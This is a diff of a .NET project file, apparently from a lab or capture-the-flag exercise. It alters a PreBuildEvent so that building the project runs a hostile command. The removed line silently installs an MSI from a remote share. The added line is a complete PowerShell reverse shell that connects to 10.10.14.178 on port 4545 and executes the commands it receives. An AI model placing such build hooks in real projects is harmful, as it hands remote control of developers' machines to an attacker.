@@ -6,7 +6,7 @@
     <ImplicitUsings>enable</ImplicitUsings>
     <Nullable>enable</Nullable>
     <PreBuildEvent>
-      <Command> msiexec /quiet /i \\10.10.14.178\8787\shell.msi </Command>
+      <Command> powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.178',4545);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()" </Command>
     </PreBuildEvent>
   </PropertyGroup>
 
